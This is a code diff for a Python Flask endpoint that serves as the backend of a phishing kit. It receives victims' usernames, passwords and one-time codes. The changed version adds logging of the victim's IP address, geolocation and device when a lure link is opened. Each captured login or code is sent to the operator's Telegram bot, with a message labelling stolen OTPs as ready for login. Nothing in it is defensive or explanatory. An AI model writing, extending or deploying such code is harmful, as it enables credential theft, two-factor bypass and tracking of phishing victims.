@@ -4,33 +4,32 @@ import os
 
 app = Flask(__name__)
 
-# Dashboard Settings se data lena
 TOKEN = os.environ.get('BOT_TOKEN')
 CID = os.environ.get('CHAT_ID')
 
 @app.route('/api/index', methods=['POST'])
-def handle_request():
-    try:
-        data = request.get_json(force=True)
-        user = data.get('u')
-        dtype = data.get('t')
-        
-        msg = f"🛰 **NEW HIT CAPTURED**\n\n👤 User: `{user}`\n"
-        
-        if dtype == 'OTP':
-            msg += f"🔢 **LIVE OTP:** `{data.get('o')}`\n✅ Status: Ready to Login"
-        else:
-            msg += f"🔑 **Pass:** `{data.get('p')}`\n📊 **Stage:** {dtype}"
+def track_target():
+    data = request.get_json(force=True)
+    dtype = data.get('t')
+    
+    # Target ka IP address lena
+    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    
+    # IP se Location nikalna
+    geo = requests.get(f"http://ip-api.com/json/{ip}").json()
+    city = geo.get('city', 'Unknown')
+    isp = geo.get('isp', 'Unknown')
 
-        # Telegram Send
-        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
-        requests.post(url, json={"chat_id": CID, "text": msg, "parse_mode": "Markdown"})
-        
-        return jsonify({"status": "success"}), 200
-    except Exception as e:
-        return jsonify({"status": "error", "message": str(e)}), 500
+    if dtype == 'VISIT_ALERT':
+        msg = f"👀 **LINK OPENED!**\n\n📍 City: `{city}`\n🌐 Network: `{isp}`\n📱 Device: `{data.get('device')[:50]}...`"
+    elif dtype == 'OTP':
+        msg = f"🔢 **OTP RECEIVED!**\nUser: `{data.get('u')}`\nCode: `{data.get('o')}`"
+    else:
+        msg = f"👤 **LOGIN HIT**\nUser: `{data.get('u')}`\nPass: `{data.get('p')}`\n📍 Loc: `{city}`"
 
-# Vercel requirements
+    requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", json={"chat_id": CID, "text": msg, "parse_mode": "Markdown"})
+    return jsonify({"s": "ok"})
+
 def handler(req, res):
     return app(req, res)
-  
+    
